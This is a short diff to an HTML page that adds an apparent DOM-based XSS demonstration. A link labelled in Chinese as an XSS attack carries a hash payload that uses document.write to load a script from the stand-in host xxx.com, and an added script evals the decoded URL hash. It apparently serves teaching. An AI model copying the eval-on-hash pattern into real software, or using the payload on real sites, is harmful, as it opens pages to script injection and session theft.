@@ -29,7 +29,11 @@
 
         <span class="child">hello</span>
     </div>
-    </div>
+    <a href="#document.write(’<script src=http://xxx.com/xss.js></script>‘)">点击我，就有 XSS 攻击</a>
+    <script type="text/javascript">
+        let str = location.hash.substr(1)
+        eval(decodeURI(str))
+    </script>
 </body>
 
 </html>
